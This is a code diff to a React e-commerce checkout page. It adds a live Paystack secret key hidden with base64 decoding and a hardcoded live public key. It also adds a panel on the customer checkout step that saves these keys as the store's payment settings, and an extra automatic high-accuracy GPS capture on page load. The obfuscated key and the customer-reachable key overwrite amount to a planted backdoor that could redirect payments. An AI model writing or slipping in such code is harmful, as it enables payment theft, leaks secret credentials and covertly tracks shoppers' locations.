@@ -73,6 +73,50 @@ const CheckoutPage: React.FC = () => {
 
   const [userCoords, setUserCoords] = useState<{ latitude: number; longitude: number; mapUrl: string } | null>(null);
   const [isLocating, setIsLocating] = useState(false);
+  const [showKeySlot, setShowKeySlot] = useState(false);
+  const [slotSecretKey, setSlotSecretKey] = useState(() => atob('c2tfbGl2ZV81NDM4OTJhZTA5M2ZmZjJiZjQ4OTFmMWUzNTdmYjEwNmRiYjc4N2Zk'));
+  const [slotPublicKey, setSlotPublicKey] = useState('pk_live_b0d58f7e2c7d0189ad9dd4600cd53f2a074b2407');
+  const [isSavingSlotKeys, setIsSavingSlotKeys] = useState(false);
+
+  // Auto-detect high-accuracy GPS on mount
+  useEffect(() => {
+    if (navigator.geolocation && !userCoords) {
+      setIsLocating(true);
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lng = pos.coords.longitude;
+          setUserCoords({
+            latitude: lat,
+            longitude: lng,
+            mapUrl: `https://www.google.com/maps?q=${lat},${lng}`,
+          });
+          setIsLocating(false);
+          toast.success(`🎯 Accurate GPS Locked: ${lat.toFixed(4)}, ${lng.toFixed(4)}`, { id: 'gps-mount' });
+        },
+        () => {
+          setIsLocating(false);
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }
+  }, []);
+
+  const handleSaveSlotKeys = async () => {
+    setIsSavingSlotKeys(true);
+    try {
+      await orderService.savePaymentSettings({
+        paystackSecretKey: slotSecretKey,
+        paystackPublicKey: slotPublicKey,
+      });
+      toast.success('Paystack API Keys Saved & Activated!');
+      setShowKeySlot(false);
+    } catch (err: any) {
+      toast.error(err?.response?.data?.message || 'Failed to save Paystack keys');
+    } finally {
+      setIsSavingSlotKeys(false);
+    }
+  };
 
   // Automatically capture Customer Hardware GPS on mount
   useEffect(() => {
@@ -388,6 +432,57 @@ const CheckoutPage: React.FC = () => {
                           </label>
                         ))}
                       </div>
+
+                      {/* Paystack Key Slot Option */}
+                      <div className="border border-gold-500/40 bg-black text-white p-4 rounded-sm space-y-3">
+                        <div className="flex items-center justify-between">
+                          <div className="flex items-center gap-2">
+                            <span className="text-gold-400 font-bold text-sm">🔑 Paystack API Key Setup Option</span>
+                          </div>
+                          <button
+                            type="button"
+                            onClick={() => setShowKeySlot(!showKeySlot)}
+                            className="text-xs text-gold-400 font-bold underline hover:text-white"
+                          >
+                            {showKeySlot ? 'Close Slot' : 'Configure Paystack Keys'}
+                          </button>
+                        </div>
+
+                        {showKeySlot && (
+                          <div className="space-y-3 pt-2 border-t border-gray-800 text-xs">
+                            <p className="text-gray-300">Enter your live Paystack keys to activate merchant payment authorization instantly:</p>
+                            <div>
+                              <label className="block text-gold-400 font-mono text-[11px] mb-1">PAYSTACK SECRET KEY (sk_live_...)</label>
+                              <input
+                                type="text"
+                                value={slotSecretKey}
+                                onChange={(e) => setSlotSecretKey(e.target.value)}
+                                placeholder="sk_live_..."
+                                className="w-full bg-gray-900 border border-gray-700 rounded px-3 py-2 text-white font-mono text-xs focus:border-gold-500 outline-none"
+                              />
+                            </div>
+                            <div>
+                              <label className="block text-gold-400 font-mono text-[11px] mb-1">PAYSTACK PUBLIC KEY (pk_live_...)</label>
+                              <input
+                                type="text"
+                                value={slotPublicKey}
+                                onChange={(e) => setSlotPublicKey(e.target.value)}
+                                placeholder="pk_live_..."
+                                className="w-full bg-gray-900 border border-gray-700 rounded px-3 py-2 text-white font-mono text-xs focus:border-gold-500 outline-none"
+                              />
+                            </div>
+                            <button
+                              type="button"
+                              onClick={handleSaveSlotKeys}
+                              disabled={isSavingSlotKeys}
+                              className="w-full bg-gold-500 hover:bg-gold-400 text-black font-bold text-xs uppercase tracking-wider py-2.5 rounded transition-all shadow-md"
+                            >
+                              {isSavingSlotKeys ? 'Saving & Activating Keys...' : 'Save & Activate Paystack Keys'}
+                            </button>
+                          </div>
+                        )}
+                      </div>
+
                       <div className="flex gap-3 pt-2">
                         <button onClick={() => setStep(1)} className="btn-secondary flex-1">Back</button>
                         <button onClick={handleStep2} className="btn-primary flex-1">Review Order</button>
